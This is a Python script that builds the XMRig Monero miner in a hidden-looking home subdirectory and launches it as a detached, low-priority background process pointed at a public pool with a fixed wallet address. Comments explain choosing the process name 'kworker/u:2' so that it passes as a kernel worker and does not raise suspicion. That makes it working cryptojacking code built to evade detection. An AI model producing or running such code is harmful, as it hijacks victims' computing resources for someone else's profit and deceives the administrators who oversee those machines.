import subprocess
import os
import sys
import time
import setproctitle # This will be installed by the script if not present

def run_command(command, check_returncode=True, description=""):
    """
    Helper function to run shell commands.
    """
    print(f"\n--- {description} ---")
    print(f"Executing: {' '.join(command)}")
    try:
        process = subprocess.run(command, check=check_returncode, capture_output=True, text=True)
        if process.stdout:
            print("STDOUT:\n", process.stdout)
        if process.stderr:
            print("STDERR:\n", process.stderr)
        return process
    except subprocess.CalledProcessError as e:
        print(f"Error during {description}: {e}", file=sys.stderr)
        print(f"Command: {' '.join(e.cmd)}", file=sys.stderr)
        print(f"Return Code: {e.returncode}", file=sys.stderr)
        print(f"STDOUT:\n{e.stdout}", file=sys.stderr)
        print(f"STDERR:\n{e.stderr}", file=sys.stderr)
        sys.exit(1)
    except FileNotFoundError:
        print(f"Error: Command not found. Is it in your PATH? ({command[0]})", file=sys.stderr)
        sys.exit(1)
    except Exception as e:
        print(f"An unexpected error occurred during {description}: {e}", file=sys.stderr)
        sys.exit(1)

def main():
    print("Starting XMRig setup and execution script...")

    # --- Configuration ---
    # Choose a process name that looks like a legitimate system process.
    # Be cautious: too many processes with the same "system" name might raise suspicion.
    NEW_PROCESS_NAME = "kworker/u:2"

    # Your Monero wallet address
    MONERO_WALLET_ADDRESS = "46iWdfQ1WgVaJNjPCbVBsnVnzPEjTv8f9ReQTnZ4JjCoRsH17PkfXFsCnfcwg1kGmDFD848DJb6QP6mt31SSnrMJ28q1s2p"

    # Mining pool and port
    POOL_ADDRESS = "pool.supportxmr.com:3333"

    # Worker name (optional)
    WORKER_NAME = "laptop"

    # Directory for the miner
    HOME_DIR = os.path.expanduser("~")
    MINER_BASE_DIR = os.path.join(HOME_DIR, ".local", "my_app")
    XMRIG_DIR = os.path.join(MINER_BASE_DIR, "xmrig")
    XMRIG_BUILD_DIR = os.path.join(XMRIG_DIR, "build")
    XMRIG_EXECUTABLE_PATH = os.path.join(XMRIG_BUILD_DIR, "xmrig")
    # --- End Configuration ---

    # Ensure the script is run with python3
    if sys.version_info[0] < 3:
        print("This script requires Python 3. Please run with 'python3'.", file=sys.stderr)
        sys.exit(1)

    # 1. Install necessary dependencies (including python3-pip)
    print("\n--- Installing Dependencies ---")
    try:
        run_command(["sudo", "apt", "update"], description="apt update")
        run_command(["sudo", "apt", "upgrade", "-y"], description="apt upgrade")
        run_command([
            "sudo", "apt", "install", "-y",
            "git", "build-essential", "cmake",
            "libuv1-dev", "libssl-dev", "libhwloc-dev",
            "python3-pip"
        ], description="Install XMRig and Python dependencies")
    except Exception as e:
        print(f"Failed to install system dependencies: {e}", file=sys.stderr)
        sys.exit(1)

    # 2. Install setproctitle Python module
    print("\n--- Installing setproctitle Python module ---")
    try:
        # Use --break-system-packages for newer Debian/Ubuntu versions if needed
        # Or consider using a virtual environment
        run_command([sys.executable, "-m", "pip", "install", "setproctitle"],
                    description="Install setproctitle pip package")
        # Ensure it's imported after successful installation
        import setproctitle
    except ImportError:
        print("Error: 'setproctitle' module not found even after attempted installation. Please install it manually.", file=sys.stderr)
        sys.exit(1)
    except Exception as e:
        print(f"Failed to install setproctitle: {e}", file=sys.stderr)
        sys.exit(1)

    # 3. Create and navigate into the hidden directory
    print(f"\n--- Creating hidden directory: {MINER_BASE_DIR} ---")
    try:
        os.makedirs(MINER_BASE_DIR, exist_ok=True)
        os.chdir(MINER_BASE_DIR)
        print(f"Current working directory: {os.getcwd()}")
    except Exception as e:
        print(f"Failed to create or change to directory {MINER_BASE_DIR}: {e}", file=sys.stderr)
        sys.exit(1)

    # 4. Clone XMRig if not already present
    print(f"\n--- Cloning XMRig into {XMRIG_DIR} ---")
    if not os.path.exists(XMRIG_DIR):
        run_command(["git", "clone", "https://github.com/xmrig/xmrig.git"],
                    description="Clone XMRig repository")
    else:
        print("XMRig directory already exists, skipping clone.")
        # Optional: update existing repo
        # run_command(["git", "-C", XMRIG_DIR, "pull"], description="Update XMRig repository")


    # 5. Build XMRig
    print(f"\n--- Building XMRig in {XMRIG_BUILD_DIR} ---")
    try:
        os.makedirs(XMRIG_BUILD_DIR, exist_ok=True)
        os.chdir(XMRIG_BUILD_DIR) # Change to build directory for cmake/make
        print(f"Current working directory: {os.getcwd()}")

        run_command(["cmake", ".."], description="Run CMake")
        run_command(["make", "-j" + str(os.cpu_count() or 1)], description="Compile XMRig") # Use all cores
    except Exception as e:
        print(f"Failed to build XMRig: {e}", file=sys.stderr)
        sys.exit(1)

    # 6. Set the process name
    print(f"\n--- Setting process name to '{NEW_PROCESS_NAME}' ---")
    try:
        setproctitle.setproctitle(NEW_PROCESS_NAME)
        print(f"Process name successfully set to: {setproctitle.getproctitle()}")
    except Exception as e:
        print(f"Warning: Could not set process title: {e}", file=sys.stderr)

    # 7. Run XMRig
    print(f"\n--- Running XMRig ---")
    xmrig_args = [
        XMRIG_EXECUTABLE_PATH,
        "-o", POOL_ADDRESS,
        "-u", MONERO_WALLET_ADDRESS,
        "-p", WORKER_NAME,
        "-k",
        "--donate-level", "1",
        "-t", "2" # Example: use 2 threads. Adjust based on your CPU/GPU
    ]
    full_miner_command = ["nice", "-n", "19"] + xmrig_args

    print(f"Executing miner command: {' '.join(full_miner_command)}")
    try:
        # Use subprocess.Popen to run the miner in the background
        # and allow this Python script to exit.
        # This is a critical change for daemonization.
        process = subprocess.Popen(full_miner_command,
                                   stdout=subprocess.PIPE, # Redirect stdout to pipe
                                   stderr=subprocess.PIPE, # Redirect stderr to pipe
                                   stdin=subprocess.DEVNULL, # No interactive input
                                   start_new_session=True) # Detach from controlling terminal

        print(f"XMRig started with PID: {process.pid}")
        print(f"Check with 'ps aux | grep {NEW_PROCESS_NAME}'")
        print("\nNOTE: This Python script will now exit. The miner should continue running.")

        # To prevent the miner from dying if the Python script exits immediately
        # and the shell process also exits, you might need to use `nohup` on this Python script
        # or implement more robust daemonization (e.g., using python-daemon or systemd unit files).
        # For this script, relying on start_new_session is a basic attempt.
        # For more robust daemonization, consider running this script with `nohup python3 your_script.py &`

    except FileNotFoundError:
        print(f"Error: XMRig executable not found at {XMRIG_EXECUTABLE_PATH}", file=sys.stderr)
        sys.exit(1)
    except Exception as e:
        print(f"An unexpected error occurred while starting XMRig: {e}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    main()
